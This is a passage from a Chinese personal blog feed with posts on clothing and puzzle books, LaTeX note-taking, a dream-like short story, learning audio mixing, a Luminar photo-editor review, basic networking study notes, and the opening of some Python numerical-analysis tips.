<p>这是一本讲穿着搭配的书，并不是时尚。看到作者的名字，很容易能猜到这是一本讲述日本穿著的书。读完这本书后，才发现这本书叫做基本穿搭，写作日本职场穿着。</p>
<p>全书的第一部分讲述了作者所想表达给读者的穿搭理念，清爽和简洁。买衣服要买普通，容易搭配的，而不是凸显个性有很多花纹图案的。第一部分大概占全书的百分之二十。接下来的篇幅我个人觉得都是水了。书中叙述了各个品牌衣服的区别和品牌，衣服种类，颜色的选购建议。作者强调了售货员所能提供的帮助绝对不止结账那么简单。</p>
<p>书中所传达的穿衣风格并不是个性鲜明的，也不是非常适合学生。学生的穿着会比书中所描述的更加鲜艳，活泼，个性鲜明和休闲。书中的穿衣风格时刻不离得体二字，短上衣的长度要遮住半个臀部。长上衣例如风衣需要到膝盖左右的位置。得体又体现在了衣物的合身上。不要松松垮垮，裤子不要又大又长。大部分书中提到的要点想要达到并不困难。但是达到这些也仅仅能获到衣着得体的评价，而不是穿的真好看。</p>
<p>书所针对的人群是那些没有任何穿搭想法的人，随随意意一路走来。不知道是什么让他们想要了解穿搭。但是“基本”穿搭应该是一个很好的开始。</p>
<p>这本书是我在车上读完的，长途旅行出乎意料的漫长。书的内容不多，调理也较为清楚，再加上半本书都有凑数的感觉，读起来非常的快。</p>
<p>这是我第一次读一本穿着搭配的书，有点让我想到想到了菜。主菜，配菜，酱料的搭配就像衣服的穿搭。看了很多，但是轮到自己的时候却永远不知道怎么搭配。</p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>Labyrinths Of Reason</title>
    <url>/posts/b0eea01f/</url>
    <content><![CDATA[<p>没有特别看懂 <a id="more"></a></p>
<p>美 威廉·庞德斯通</p>
<p>这本书所讲述的内容就如他的副标题所述：“悖论，谜题及知识的脆弱性”</p>
<p>读完这本书真的就如囫囵吞枣，有点难。作者对于一些细节的讲述并不是特别清楚。尤其是悖论还是一个很难讲述的东西。我尝试给别人讲述书中的悖论，经常讲的其他人一头雾水。 每一章基本都已谜题或这悖论开始，接着对其进行分析和推广，最后总结其对知识的影响。 可以说说里面最好看的一章，是其对福尔摩斯一章的引用。其他章节都算是比较枯燥了，虽然也有例子穿插其中。 可能我真的没有理解这本书把。。</p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>用Latex做数学课的笔记</title>
    <url>/posts/960bb9d2/</url>
    <content><![CDATA[<p>突发奇想用Latex和Markdown记录理科的笔记。 <a id="more"></a></p>
<p>上课做笔记时，比较重要的是速度。老师擦完黑板，我只记了一半的话就很麻烦。第二个比较重要的是信息量，我到底记下来了多少有效的信息。</p>
<p>电脑打出来的字工整，还容易归档。文科的Lecture上可以听到劈里啪啦的键盘声。但是理科课上，大家都倾向于使用笔杆子写公式，抄板书。</p>
<p>Latex负责写公式，Markdown负责格式，这样会不会很舒服呢？再加上Vim的快捷键。我相信Vim，Emacs的快捷键算是效率最高的了。</p>
<p>真正的尝试了一下，需要定制化的部分很多，不然速度会不够快。</p>
<p>市面上完美兼容Vim，Emacs快捷键的编辑器不多。再之我还希望它有像Typro那样边写边预览的功能。</p>
<p>偶然找到了<a href="https://tamlok.github.io/vnote/en_us/">Vnote</a>。基本上完美支持Vim快捷键，还可以边写边预览。</p>
<p>我其实对Vim快捷键的掌握只停留在最基本的增删查改。上次使用Vim似乎是遥远的冰河世纪。随着我使用Vnote，Vim快捷键逐渐在我脑子里复苏。比较奇怪的是寄存器。Vnote上写兼容Vim的寄存器功能，但不管我怎么试<code>"0p"</code>等命令，一个都不管用。</p>
<p>Vnote长的更像是一个IDE，左右各一个侧边栏，有着目录预览等等功能。但它没有Latex代码补全，Snippet要自己编写，选项的解释也不太清楚。总的来说记笔记够了，但是快速记笔记还需要自己倒腾一下。把代码补全给搞上，至少它得会帮我闭合<code>$</code>。在Vnote中，公式的换行不能简单的在<code>$$ $$</code>中实现。得用<code>$$\begin&#123;split&#125;</code>,然后在需要对齐的地方加上<code>$</code>，换行的地方加上<code>\\</code>。这些键离常用的字母按键还挺远的。</p>
<p>正常情况下，你用简单的单行（行内）Latex开始写，即<code>$ $</code>。然而你发现老师写的式子竟然换行了。这时候的修改就不是那么容易了，不仅得改Section的开头和结尾，还得在中间插入对称的符号。</p>
<p>我尝试了一节课，速度勉强跟得上。<code>shift</code>,<code>$</code>,<code>\</code>这三个在键盘角落的键按的我累死。虽说这样记笔记好处多。工整，又方便存档和分享。我还是选择就此放弃，毕竟笔记只是一部分，上课一部分的心思还得挂在老师说的话上面。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Class Note</tag>
      </tags>
  </entry>
  <entry>
    <title>林月夕</title>
    <url>/posts/a661a289/</url>
    <content><![CDATA[<p>一个安静的女孩出现在喧嚣的都市中。</p>
<a id="more"></a>
<center>
<p>
我： 明天去打枪好么？ 林月夕： 好的
</p>
</center>
<p>第二天 我走到昨天约好的地方。我一点都不相信这里还有射击场馆。在我面前的是一个类似剧院一样的建筑。但是不同与我以往所见到的，这一栋明显更加破旧与昏暗，并不是那种让人压抑的昏暗。这个昏暗似乎是这栋建筑与生俱来的，给我亲切，包容的感觉。</p>
<p>林月夕就站在那里。昏暗的灯光下，我看不清她穿的是一件黑色的还是浅色的针线衫。她安静的站在那儿，不知道在想什么。“走吧。”我走上前。 她刚刚回过神来，脸上露出迷糊的表情。我不禁多看了她一眼，越过她身边时又轻轻说了一句，“走吧”。 她才从自己的思考中清醒过来，一声不吭的跟上了我的步伐。</p>
<hr>
<p>射击馆内更像一个喧闹的菜市场。真正用来射击的地方非常小，大约只有4条50米跑道的大小。其他地方都堆满了杂物，还有各处叫卖的商贩。馆内和场馆的外表一样的暗淡无光。不知为什么，空气泛着沙子一样的色彩，好似我处在沙漠中的集市。我回头看了一眼林月夕，她仍然站在我身侧。我感觉到她在盯着什么，但由于昏暗的灯光，我看清她的视线。感受着她模糊的存在，我走到了射击道的前台。这儿只有一个教练，他正在收拾东西。在他面前是一个有5个仪表盘的仪器，看着像是各种电平表。教练抬头，干脆利落的报出了价格：“带教练辅导30元一次，自己玩20元一些。”他打量了一下我和身后的女孩，又挤出了几个字，“自己打，自由一些。” 我回头想与林月夕讨论一下。她低着头，没有回应我的目光。受到林月夕宁静的气质影响，我在这样嘈杂的环境下独自思考也没有什么阻塞感。我们两个都没打过枪，那么就要个教练教一下吧。</p>
<p>“三十块钱，教练。”</p>
<p>教练摸走了钱，开始给我们讲解射击的技巧。他又带着我们来到靶子旁边。指着一个我刚刚看见的，有着5个仪表盘的仪器慢条斯理的说到：“这个是调整靶子的。前三个是比较基础的调整靶子位置的。后面两个个就比较复杂了，”教练随意的在剩下的仪表盘上操作了一下，仪表盘上的指针不断的变换，“你们只需要知道这个操作杆子，复位用的。” “卡擦”，后面两个仪表盘的读数逐渐归0。</p>
<p>跟在教练身后走回台前，此时台前已经排起了长队。我和林月夕利索的来到队伍最后开始排队。队伍里有开着扬声器看直播的人，也有在那儿讨论直播里唱歌唱的好不好听的人。</p>
<p>“这儿明明是一个全音。” “不，这是一个半音。”</p>
<p>“呵，乐理。主播唱歌真的不好听，如果不用声卡内置功能的话。”突然我意识到什么，林月夕似乎比我见到过的主播还漂亮。我下意识的转过头去，去确认我心中的想法。回过头并没有看到我印象中那个宁静的身影。我四处张望了一下，看见林月夕正在悄默默地向前走着，越过几个排在队中，却站在那儿不动的人。我看着好笑，也快步跟了上去。林月夕注意到身旁的我，露出了一个活泼的笑容。拉起了我的手，继续静悄悄地往前摸。</p>
<hr>
<p>傍晚，我们走出了场馆。我吸一口冰冷清爽，独属于黄昏的空气，大脑刷新了一下。“你今天怎么来的？” 在要分别的时候，我突然问出这样的问题。</p>
<p>女孩子笑了笑，有些失望和萧索，似乎责备我关心的太晚了：“我坐飞机来的。”</p>
<p>“坐飞机来的？好远啊。”</p>
<p>“是啊。”林月夕看着远处，飞机飞进了晚霞中。</p>
<p>思索了一会，“要我送你去机场么？” 我一字一句慢慢的说了出来。</p>
<p>“为什么会突然想到为我送机？”，林月夕神秘的一笑。</p>
<p>“因为。。。因为我从来没有在机场送过别人。我想要送送你。”这是我得出的答案，不知道林月夕是否满意。</p>
<p>林月夕没有说什么，继续往前走。</p>
<p>我叫了一辆出租车，示意我会送她去机场。林月夕没有说什么，乖巧而又沉默的坐进了后座。我迅速坐进了前座。</p>
<p>“师傅，到机场。”</p>
<p>“好嘞，小伙子去菜场是么。”</p>
<p>“不，是机场。”</p>
<p>在确认司机听懂了我说的话后，我闭上了眼睛。车内又陷入了沉默。</p>
<p>我习惯性的回头看一眼林月夕，后座上没有人。我探头看了看之前视线的死角，后座的确上没有人，只有一个大大的球包类似的东西。球包的旁边靠着一个小小的双肩背包。出租车后座的扶手上有一个女士提包。</p>
<p>“师傅，停车！”</p>
<p>我迅速的爬到后座上，看着空无一人的后座，我深吸了一口气，林月夕到底在哪。心情没来由的有些烦躁。良久，“师傅，往回开。帮我注意一下街两边有没有有一个穿着，”我愣了一下，“黑色针织衫的，黑色长发的女孩子。”师傅没有回答，似乎是在等我报出更多的特征。“她。。。。。” 车子突然一个加速，掉头，往回开。“我知道了。”师傅回应道。</p>
<p>看着扶手上的提包，我回忆着。我到底在回忆什么呢，我记得什么呢？我手伸了出来，迟疑着，终于下定了决心，打开了那个大大的像是球包的东西。球包里面零零散散的放着十几个羽毛球拍。这些球拍颜色，样式各不相同，但是它们却有一个共同点-它们的拍头全是弯的。主人似乎用这些球拍大力敲击过什么东西的样子。我小心翼翼的抽出了一个球拍，很轻，没有廉价的感觉。我认为是非常名贵的球拍。球包里没有留下其他的东西，除了球拍。</p>
<p>我打开旁边的小双肩包，里面是许多的文件夹。我粗暴的翻了翻，在双肩包的底部，找到了不少被文件夹压住的草稿纸。我小心的充满期待的拿了出来，上面是密密麻麻的字迹。甩了一甩这叠纸，我预估大概有十张的样子。我迫不及待的阅读起第一张。字很多，但是表达的意思很简单。林月夕的确是乘着早上的航班来到了我的城市，她的父母很忙，天天在两个城市间飞机往返。他们没有空也不知道林月夕在做些什么。翻过前几张承载着孤独的纸，下面几张是林月夕的日常生活。我直接翻到了最后一张。</p>
<p>林月夕： 很高兴你能想着来送我，我想我现在已经在飞机上了，看着我喜欢的游戏直播。如果你来送我的话，我肯定赶不上我所喜欢的游戏直播了。</p>
<p>“师傅，停车。不用找了。我要下车。”</p>
<p>我慢慢的走下了车，意识到了什么，又似乎什么都不知道。我迷迷糊糊，昏昏的走在华灯初上的街头。“她在飞机上，我该去哪呢？今天到底去了哪？”我随手想从包中摸出那叠纸，在路灯下再好好看。</p>
<hr>
<p>Rua，包呢！我头脑清醒了一些。包被我忘在出租车上了。车牌号是多少？滴滴叫的车。我可以在历史订单里找。手机呢？Rua，还在车上。怎么办，我要拿回我的手机。</p>
<p>手机。。手机。。。手机。。。 我的手伸向了床头柜。。。。</p>
<p><strong>林夕</strong>便是<strong>梦</strong>。</p>
<hr>
<center>
<img class="lazyload" data-src="/static/images/linyuexi-gift.png" height="50%" width="50%">
</center>
]]></content>
      <categories>
        <category>人文修养</category>
      </categories>
      <tags>
        <tag>Novel</tag>
      </tags>
  </entry>
  <entry>
    <title>混音</title>
    <url>/posts/511f64d7/</url>
    <content><![CDATA[<p>我要成为信息安全圈中混音第二人。这样还可以向第一人学习。 <a id="more"></a></p>
<h1 id="起因">起因</h1>
<p>最近做了很多跟安全有关的事情，去尝试了OSCP。结果显而易见，挂科。安全是一个理性的领域，一个反人性的领域。因为安全就是去寻找开发者顺着自己的习惯，开发出来的产品中的错误。开发是顺着平常的思维，人性走的。然而安全就是要反着思考，与人性对抗。开发者让你输入数字，那我一定要去输入字母，去看看会发生什么。程序绝对是遵守因果律的，这样一个严谨的领域无时无刻不在影响着我的思考方式-向理性靠拢。在这样一个反人性，理性的领域，我身上会缺少些许艺术，人文，感性的气息。比如我不会用使用含义模糊的词，不会从感受的角度出发。我会尝试去定义每一个我觉得模糊的词，比如之前提到的 <a href="https://blog.inevitable.tech/2018/02/28/aimei/">“暧昧”</a>。</p>
<p>最近听的音乐也变多了，从古风歌曲，动漫，galgame的ost，再到层次不齐的翻唱。光是听，已经不能令我满足。批判性思维强迫我去评价它，去学会欣赏它。然而恰巧乐理，是我的短板。音乐老师一年前讲的乐理，我一年后才能够理解。高一的音乐课，我完全是在迷茫中度过。并且我觉得自己连别人唱歌跑不跑调都听不出来。唯一能确定的是，我唱歌是跑调的。</p>
<h1 id="foobar">Foobar</h1>
<p>第一次接触跟后期有关的东西是foobar。在某一天，我惊喜的发现ios版的网易云音乐可以调整EQ，然而安卓版本和电脑版却没有这个功能。除了大骂网易开发之更新广告，不更新功能。我也迫切想要尝试一下EQ。在网上找了一圈，发现了Foobar-功能强大的播放器（虽然现在发现并没有什么用，后文会提到）。</p>
<p>Foobar支持各种图像（例如频谱图，电平图），还支持一系列的DSP（Digital Signal Processor)插件。我尝试了BBE的一系列插件，发现L82 Sonic Maximizer 特别好用。可以明显让低频变的有力，或者突出人声。</p>
<p>在寻找这些插件的过程中一步一步的接触到了 Mix（混音）。</p>
<h1 id="感想">感想</h1>
<p>真正接触了混音，才发现Foobar啥都是渣，而且没什么用的。毕竟Foobar最多算是不合格的总线处理。然而混音面对的都是音轨，可以更加精确的调整出我想要的效果。混音入门简单（我大概花了一个礼拜），只需要弄明白基本操作就好了。我想要感谢B站的 “月光如水XY”。入门期间我都是看的他的视频。虽然他讲的不是那么的简洁（我开2-3倍速看的），但他在每期都会提到自己近期的混音工作。这帮助我得以窥见混音圈是什么样的，以及一些翻唱的基本常识。但是想要进阶便需要大量的练习了。整个混音的步骤是：首先在脑海里构思出成品的样子（审美）--》用什么效果器去处理来得到我想要的效果（技术）--》找出哪里与自己的预期不符（评价）。评价之后对自己不满意的地方进行更改，并再次评价，更改，改到自己满意位置。</p>
<p>混音是一个精益求精的工作，需要大量的耐心，一遍又一遍的去寻找完美，需要去一个字一个字的耐心的改。现在我尚且处于技术的步骤，正在熟悉各种效果器。</p>
<p>另一个极为重要的点便是审美。混音是一个培养自己审美的工作。自己的审美便是自己工作的一把量尺。其实除了混音可以帮我探索审美，哲学也是可以帮助我去寻找审美的。哲学里的一个重要分支便是美学。</p>
<p>混音的确是可以确立一首歌的风格，将一首歌升华。同一首歌交给不同的两位大师做混音，得到的成品是截然不同的。或者可以说每一个音轨（包括人声轨）都是配好的菜。混音便是炒菜这个步骤。混音不仅是抹去瑕疵（像修音，对轨），但更是一次创造。炒出来的菜必定比生的菜好吃。菜品是否好吃取决于三点-厨师的口味，厨师的炒菜技术以及原料的质量。网上所说的你与明星之间只差一个混音师，这种说法真的是业界毒瘤。</p>
<p>做了混音后，我终于发现我为什么听不出跑调了。因为做过后期的歌都不跑调，即使歌手跑调了，混音师也会在后期把跑的调给纠正回来了。</p>
<p>如果说到给歌手唱的歌做后期，那么混音妥妥的属于一个服务行业了。这是我第一次去尝试服务行业，不知道有什么惊喜在等着我呢。我有一个小小的梦想，希望我的客人遍布五湖四海，这样不管我去哪里旅游，总是能碰到认识的人。</p>
<p>混音的世界很大，我会努力保留下我这属于艺术的爱好的。</p>
<hr>
<p><img class="lazyload" data-src="/static/images/mixgift.jpg"></p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>Mix</tag>
      </tags>
  </entry>
  <entry>
    <title>Luminar</title>
    <url>/posts/e200fba8/</url>
    <content><![CDATA[<p>Luminar 是个简单强大的图片批量处理软件（其实不能批量处理，来回切图片载入要半分钟）。</p>
<a id="more"></a>
<p>我在夏季打折的时候入了 <a href="https://skylum.com/luminar">Luminar</a>，59 刀两个激活码。购买时除了官方折扣之外，还可以使用一些 aff。这样可以再便宜 10 刀左右。</p>
<p>Luminar 是一个 Lightroom 的竞品。细节，性能上不如 Lightroom，但是拥有更多的功能。</p>
<p>第一次使用 Lightroom CC 的时候，我被颇具年代感的 UI 设计给吓到了。浅灰色的背景似乎是移动互联网时代之前的设计。Lightroom（在线版本）具有更好看的设计，但是不能在本地运行。这意味着所有照片都需要传到云端进行编辑。Lightroom 手机版也是免费的，但手机哪会有电脑好用呢？</p>
<center>
<img class="lazyload" data-src="/static/images/luminar1.png" height="80%" width="80%">
</center>
<h2 id="功能">功能</h2>
<p>Luminar 有着丰富的 AI 功能。从最基本的一键调整画面曝光，饱和度等，到一键替换天空应有尽有。从使用者的角度来看，这些功能都非常的实用。以前可能要反反复复调节很多不同的效果，但是现在只要调整一个 AI 效果了。</p>
<p><a href="https://skylum.com/luminar/filters/accent-ai">AI Accent</a> 是可以智能调节画面的饱和度，曝光等等。单纯调节 <a href="https://skylum.com/luminar/filters/accent-ai">AI Accent</a>，就可以非常快速的得到一张还不错的成品。第一张是原图，第二张是将 AI Accent 拉到 84, 未做其他修改。</p>
<center>
<img class="lazyload" data-src="/static/images/luminar2.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/luminar3.png" height="80%" width="80%">
</center>
<p><a href="https://space.bilibili.com/430726">图片出处</a></p>
<p><a href="https://skylum.com/luminar/filters/structure">AI Structure</a> 可以智能的调节画面中的细节。可以让照片锐利不少。</p>
<p>Smart Contrast 相比于传统的对比度调整，它保留了更多颜色和细节。让照片看上去更加的真实。</p>
<p>常常感觉我头顶上的天空和别人头顶上的天空是不同的。自己脑袋上的天空灰灰的，没有云，一点都没有层次感。然而别人拍出来的天空立体，生动。AI Sky Replacement 就很好的帮助我将自己头上的天空变得更加生动。这个一键替换的效果非常的真实，就像天空原来就是那样的。我也可以进一步为照片中添加额外的光线。例如添加一些丁达尔效应，又或者是逆光拍摄时漂亮的轮廓光。此处只改变了天空。如果想要看更好的效果，可以看官网的 <a href="https://skylum.com/luminar">范例</a>。</p>
<center>
<img class="lazyload" data-src="/static/images/luminar4.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/luminar5.png" height="80%" width="80%">
</center>
<p><a href="https://www.signatureedits.com/free-raw-photos/">图片出处</a></p>
<p>人像也是 Luminar4 主打的功能之一。它可以对眼睛，嘴唇以及面部亮度进行一键调整。甚至还有美颜相机中瘦脸，和把眼睛变大的功能。</p>
<p>在遮罩层（Mask）上，Luminar4 推出了亮度遮罩层（Luminosity Mask）。这使逆光照片和大光比场景照片的编辑简单了很多。亮度遮罩层可以生成一个对越亮的地方效果越强的遮罩层。这样仅仅在这个遮罩层上调整曝光，我们就可以将亮部曝光下降，让这个照片有更多的细节。如果不使用亮度遮罩层，我们可能需要花更多的时间去为亮部画一个遮罩层，而且还要考虑亮部和主体过渡是不是自然的问题。这张原图的亮部在天空。因此天空部分是纯红色。</p>
<center>
<img class="lazyload" data-src="/static/images/luminar6.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/luminar7.png" height="80%" width="80%">
</center>
<h2 id="缺点">缺点</h2>
<p>细节上 Luminar 还缺不少。比如不能一键将照片横平竖直。比如很多颜色，曝光调整工具不支持滴管工具。在 Lightroom 中，我们可以在照片上拖拽来改变曝光或者色相。Luminar 缺少了很多类似的小细节。</p>
<p>性能也是 Luminar 的短板。在常规功能上，Luminar 就慢于 Lightroom，比如 HSL，曝光调整，照片导出之类的。多照片的编辑性能也很差。编辑完照片A, 打开照片B进行编辑。如果此时再去浏览照片A，需要加载十五秒到半分钟的。加载时间取决于我做的修改有多少。</p>
<p>在独有的AI功能上便需要更多的运算时间。生成一个亮度遮罩层（Luminosity Mask）需要半分钟。很多功能的运行时间取决于你的图层数量和施加的效果有多少。你改变的越多，运行时间便越长。</p>
<p>在官方论坛中，用户有着各式各样的特性需，但用户的大部分需求都没有被满足。用户两三年前急需的功能遥遥无期。也有一些官方承诺添加的功能无限制搁置。这看上去并不是一家贴近用户的公司。</p>
<p>总的来说 Luminar 是一个专注图像AI处理的软件，它着重于开发新功能而不是打磨现有功能。</p>
]]></content>
      <categories>
        <category>Arts</category>
      </categories>
      <tags>
        <tag>Photo</tag>
      </tags>
  </entry>
  <entry>
    <title>安全学习笔记一（网络）</title>
    <url>/posts/a6040574/</url>
    <content><![CDATA[<p>网络是这个时代最神奇的东西，是它将人类联系在了一起。</p>
<a id="more"></a>
<p>一共有三种主要的网络模型，分别是OSI七层模型，TCP/IP五层模型和TCP/IP 四层模型。 # 0x01 网络模型</p>
<h2 id="seven-layers-of-osi-model">Seven Layers of OSI Model:</h2>
<p>7.Application Layer 6.Presentation Layer 5.Session Layer 4.Transport Layer 3.Network Layer 2.Data Link Layer 1.Physical Layer</p>
<h2 id="five-layers-of-tcpip-model">Five Layers of TCP/IP Model:</h2>
<p>5+6+7.Process&amp;Application Layer 4.Transport Layer 3.Network Layer 2.Data Link Layer 1.Physical Layer</p>
<h2 id="four-layers-of-tcpip-model">Four layers of TCP/IP Model:</h2>
<p>5+6+7.Process&amp;Application Layer 4.Transport Layer 3.Network Layer 1+2.Physical Layer</p>
<table>
<thead>
<tr class="header">
<th>Five Layers of TCP/IP</th>
<th>Protocol</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Process&amp;Application Layer</td>
<td>Message(报文):<strong>SMTP</strong>,<strong>FTP</strong>,<strong>TELNET</strong>,<strong>DNS</strong>,<strong>TFTP</strong>,<strong>RPC</strong>....</td>
</tr>
<tr class="even">
<td>Transportation Layer</td>
<td>Communications Protocol(传输协议):<strong>TCP</strong>,<strong>UDP</strong></td>
</tr>
<tr class="odd">
<td>Network Layer</td>
<td>IP Datagram(IP 数据报):<strong>IP</strong>(ICMP...),<strong>ARP</strong>,<strong>RARP</strong></td>
</tr>
<tr class="even">
<td>Data Link Layer</td>
<td>Frame(帧)</td>
</tr>
<tr class="odd">
<td>Physical Layer</td>
<td><strong>Ethernet</strong>,<strong>Token-Ring</strong>,<strong>X.25</strong>,<strong>FDDI</strong></td>
</tr>
</tbody>
</table>
<p>接下来介绍一下在OSI模型中各个layer的用处。</p>
<h3 id="physical-layer物理层">1. Physical Layer(物理层)</h3>
<p>物理层用来激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。为上层协议提供一个可靠的物理媒体。<strong>物理层确保数据可以在各种物理媒体上传输</strong>。</p>
<p>重要设备 * Repeater(中继器) * Hub(集线器)</p>
<h3 id="data-link-layer数据链路层">2. Data Link Layer(数据链路层)</h3>
<p>数据链路层将源自网络层来的数据可靠地传输到相邻节点的网络层。因此，数据链路层拥有这样的一些主要功能: 数据成<strong>帧</strong>(<strong>frame</strong>-数据链路层的基本数据传送单位)，物理地址寻址，流量控制，数据检错、重发。</p>
<p>重要设备 * Bridge(网桥) * Switch(交换机)</p>
<p>主要协议 * Ethernet(以太网协议)</p>
<h3 id="network-layer网络层">3. Network Layer(网络层)</h3>
<p>网络层用来实现两个端系统之间的数据透明传送。网络层拥有这样的一些主要功能: 寻址，路由选择，连接的建立、保持和终止。</p>
<p>主要协议 * Internet Protocol(因特网互联协议) * Internet Control Message Protocol(因特网控制报文协议) * Address Resolution Protocol (地址解析协议) * Reverse Address Resolution Protocol(逆地址解析协议)</p>
<p>重要设备 * Router(路由器)</p>
<h3 id="transportation-layer传输层">4. Transportation Layer(传输层)</h3>
<p>传输层负责将数据可靠的传送到相应的<strong>端口</strong>，并利用子网的特性为会话层提供建立、维护和取消传输链接的功能。传输层还要处理端口到端口的差错控制和流量控制问题。</p>
<p>数据传送的协议数据单元称为datagram(段、报文)</p>
<p>主要协议 * Transmission Control Protocol(传输控制协议) * User Datagram Protocol(用户数据报协议)</p>
<p>重要设备 * 网关</p>
<h3 id="session-layer会话层">5. Session Layer(会话层)</h3>
<p>会话层管理主机之间的会话进程，校验数据的同步</p>
<h3 id="presentation-layer表示层">6. Presentation Layer(表示层)</h3>
<p>表示层保证一个主机应用层的信息可以被另一个主机的应用层理解。表示层用数据的加密、压缩、格式转换等来对数据包进行转化。</p>
<h3 id="application-layer应用层">7. Application Layer(应用层)</h3>
<p>为操作系统和应用程序提供访问网络服务的接口。</p>
<p>重要协议 in Session Layer、Presentation Layer、Application Layer * FTP(文件传送协议) * Telnet(远程登录协议) * DNS(域名解析协议) * SMTP(邮件传送协议) * POP3(邮局协议) * Hyper Text Transfer Protocol(超文本传输协议)</p>
<h1 id="x02-ip地址">0x02 IP地址</h1>
<p>IP地址是四串用"."连接起来的数字。例如192.156.122.122。转化为二进制便是8*4位。</p>
<p>每个ip地址便有网络标识段和主机标识段构成。</p>
<p>在二进制下，当主机号全为0，则代表了网络号所代表的网络。</p>
<p>在二进制下，当主机号全为1，则向网络号所代表的网络中发放广播。改网络内的所有主机都能收到广播信息。这样的地址被称为<strong>Broadcast Address(广播地址)</strong></p>
<p>255.255.255.255为受限的广播地址。受限广播地址只能用于本地网络，不能跨子网传播。</p>
<p>0.0.0.0常用与寻找自己的IP地址</p>
<p>127.0.0.0/8(/8为子网掩码)被用作回环地址。回环地址表示本机的地址，常用与对本机的测试。</p>
<h2 id="abcd类地址">A、B、C、D类地址</h2>
<p>A类地址以0开头(二进制下)，第一个字节（二进制下的前八位数字）作为网络标识段，地址范围为：0.0.0.0~127.255.255.255</p>
<p>B类地址以10开头(二进制下)，前两个字节作为标识段（二进制下的前十六位数字），地址范围是：128.0.0.0~191.255.255.255</p>
<p>C类地址以110开头(二进制下)，前三个字节作为标识段(二进制下的前二十四位数字），地址范围是：192.0.0.0~223.255.255.255</p>
<p>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为<strong>Multicast Address(组播地址)</strong>（一对多的通信）</p>
<h2 id="abcd类私有地址private-address">A、B、C、D类私有地址(Private Address)</h2>
<p>Private Address 也叫专有地址，只具有本地意义。 A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255 B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255 C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255</p>
<h2 id="子网掩码以及网络划分">子网掩码以及网络划分</h2>
<p>随着网络应用的扩大，由于IPv4网络标识段太长，而主机标识段太短的弊端暴露了出来。即主机地址越来越少。因此人们采用子网即对一个高类别的IP地址进行再划分，以形成多个子网，提供给不同规模的用户群使用。。</p>
<p>如何计算子网掩码呢，例如 192.168.0.5/24。 24 在在这意味着IP地址(二进制下)前24位为网络标识段，之后的8位为主机标识段。 子网掩码便是24个1加8个0.即为255.255.255.0 在一个/24的子网下共可以容纳2**8-3个主机(减去网关地址，广播地址以及网络地址)。</p>
<h2 id="arp-协议">ARP 协议</h2>
<p>即根据IP地址获取物理地址(MAC地址)</p>
<h2 id="tcp-协议">TCP 协议</h2>
<p>TCP是面向连接的，可靠的字节流服务 TCP的三次握手和四次挥手 <img class="lazyload" data-src="/static/images/network1.jpg"></p>
<h2 id="udp-协议">UDP 协议</h2>
<p>DP是面向无连接的，不可靠的数据报服务。 UDP与TCP位于同一层。它是面向无连接的通讯协议。UDP不管数据包的顺序、错误或重发。所以UDP用于面向查询应答的服务，只需交换较小信息量的服务。</p>
<h2 id="dns协议">DNS协议</h2>
<p>Domain Name System(DNS) 用来将url转换为IP地址。</p>
<h2 id="nat协议">NAT协议</h2>
<p>NAT网络地址转换(Network Address Translation)是一种将私有（保留）地址转化为合法IP地址的转换技术。例如现在运营商运用NAT技术，一个小区同用一个出口IP。</p>
<h2 id="dhcp协议">DHCP协议</h2>
<p>DHCP动态主机设置协议（Dynamic Host Configuration Protocol）用来动态地给内部网络或网络服务供应商自动分配IP</p>
<h2 id="http协议">HTTP协议</h2>
超文本传输协议（HTTP，HyperText Transfer Protocol)用来向服务器请求数据。
<hr>
<p><img class="lazyload" data-src="/static/images/network-gift.jpg"></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>初入数值分析，如何写好代码</title>
    <url>/posts/e6738e32/</url>
    <content><![CDATA[<p>写一些关于数学的代码，和开发程序是两种不同的感觉。接下来是一些我个人常用的 Tips。</p>
<a id="more"></a>
<h1 id="sum">Sum</h1>
<p>求和符号频繁的出现在各种公式里面。比如 Composite Simpson Rule:</p>
<p><span class="math inline">\(\int^a_b f(x)dx = \frac{h}{3}(f(a)+f(b)+4\sum^{n/2}_{i=1}f(a+(2i-1)h)+2\sum^{(n-2)/2}_{i=1}f(a+2ih))\)</span></p>
<p>我之前看到求和符号的第一反应是这儿又得用 <code>for loop</code> 了。例如 <span class="math inline">\(\sum^{n/2}_{i=1}f(a+(2i-1)h)\)</span> 可能会用以下的代码来计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n//<span class="number">2</span>+<span class="number">1</span>):</span><br><span class="line">  <span class="built_in">sum</span> = <span class="built_in">sum</span>+f(a+(<span class="number">2</span>*i-<span class="number">1</span>)*h)</span><br><span class="line"><span class="built_in">sum</span></span><br></pre></td></tr></table></figure>
<p>这是一个有点冗长，不清楚的写法。</p>
<h2 id="map">Map</h2>
<p>我们可以用 <code>np.sum</code> 和 <code>map</code> 函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">np.<span class="built_in">sum</span>(np.array(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i:f(a+(<span class="number">2</span>*i-<span class="number">1</span>)*h),np.arange(<span class="number">1</span>,n//<span class="number">2</span>+<span class="number">1</span>)))))</span><br></pre></td></tr></table></figure>
